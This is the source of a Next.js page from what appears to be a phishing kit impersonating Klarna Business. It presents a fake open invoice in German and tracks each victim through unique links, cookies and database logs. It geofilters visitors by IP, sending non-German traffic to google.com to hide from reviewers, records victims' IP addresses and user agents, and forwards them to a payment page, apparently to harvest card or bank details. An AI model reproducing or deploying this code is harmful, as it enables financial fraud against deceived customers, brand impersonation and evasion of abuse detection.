import React, {useEffect} from "react";
import {useRouter} from "next/router";
import {useUserAgent} from 'next-useragent'
import {GetServerSideProps} from "next";
import Cookies from "cookies";
import prisma from "../prisma/prisma";
import requestIp from 'request-ip'
import IPInfoWrapper from "node-ipinfo";
import {Product} from "../types/Product";
import {User} from "../types/User";
import Header from "../components/Header";
import TrustedBy from "../components/TrustedBy";
import SmartCard from "../components/SmartCard";
import CustomerCard from "../components/CustomerCard";
import Footer from "../components/Footer";
import Invoice from "../components/Invoice";
import Banner from "../components/Banner";
import Head from "next/head";

export const getServerSideProps: GetServerSideProps = async ({
                                                               req,
                                                               res,
                                                               params,
                                                             }) => {
  const link = params?.link as string;
  const cookies = new Cookies(req, res);
  const id = cookies.get("id");
  const url = cookies.get("url");

  const defaultProps = {
    uaString: req.headers['user-agent'],
  };

  if (id && url && url === link) {
    const log = await prisma.log.findFirst({
      where: {id: parseInt(id)},
      include: {link: true},
    });
    if (log)
      if (log.link.url === url) {
        if (log.active && !log.done) {
          if (log.state > 0)
            return {
              redirect: {permanent: false, destination: `/payment/${link}`},
            };
          const {user, product} = JSON.parse(log.defaultData);
          return {props: {id, nextState: log.pages[log.pages.indexOf(log.state) + 1], user, product, ...defaultProps}};
        } else {
          return {redirect: {permanent: false, destination: "/"}};
        }
      }
  }

  const linkData = await prisma.link.findUnique({where: {url: link}, include: {logs: true}});

  if (linkData) {
    let ip = requestIp.getClientIp(req);
    ip = ip === "::1" ? "82.83.55.62" : ip;
    const ipInfoWrapper = new IPInfoWrapper(process.env.IPINFO_TOKEN);
    const ipData = await ipInfoWrapper.lookupIp(ip);
    if(ipData?.country !== "Germany") {
      await prisma.link.update({
        where: {id: linkData.id},
        data: {filtered: linkData.filtered + 1},
      });

      return {
        redirect: {
          destination: "https://www.google.com",
          permanent: false,
        },
      };
    }

    if (linkData.active) {
      if (linkData.single && linkData.logs.length > 0) {
        const log = linkData.logs[0];
        cookies.set("id", log.id, {sameSite: "strict"});
        cookies.set("url", link, {sameSite: "strict"});
        return {
          redirect: {permanent: false, destination: `/${link}`},
        };
      }

      await prisma.link.update({
        where: {id: linkData.id},
        data: {views: linkData.views + 1},
      });

      const log = await prisma.log.create({
        data: {
          linkId: linkData.id,
          active: true,
          done: false,
          pages: linkData.pages,
          state: linkData.pages[0],
          defaultData: linkData.defaultData
        },
      });

      if (log) {
        cookies.set("id", log.id, {sameSite: "strict"});
        cookies.set("url", link, {sameSite: "strict"});
        const {user, product} = JSON.parse(log.defaultData);
        return {props: {id: log.id, nextState: log.pages[log.pages.indexOf(log.state) + 1], user, product, ...defaultProps}};
      }
    }
  }

  return {
    redirect: {
      destination: "/",
      permanent: false,
    },
  };
};

type Props = {
  uaString: string;
  user: User,
  product: Product,
  id: number;
  nextState: number;
};

const App = (props: Props) => {
  const router = useRouter();
  const userAgent = useUserAgent(props.uaString);

  async function forward() {
    const result = await updateLog(props.id, {state: props.nextState});
    if (result) router.reload();
  }

  async function updateLog(id, data) {
    const result = await fetch("/api/logs/update", {
      method: "POST",
      body: JSON.stringify({id: parseInt(id), data}),
    }).then((res) => res.json());

    return !result.error;
  }

  async function getIp() {
    const result = await fetch("/api/getIp", {
      method: "POST"
    }).then((res) => res.json());
    return result?.ip;
  }

  useEffect(() => {
    getIp().then(async (ip) => await updateLog(props.id, {ip, userAgent: userAgent.source}));
  });

  return (
    <>
      <Head>
        <title>Klarna Business – Payment Solution</title>
        <link rel="icon" href="/favicon.ico"/>
      </Head>

      <Banner/>
      <Header name={'Offene Rechnung'}/>
      <Invoice user={props.user} product={props.product} forward={forward.bind(this)}/>
      <TrustedBy/>
      <SmartCard/>
      <CustomerCard/>
      <Footer/>
    </>
  );
};

export default App;
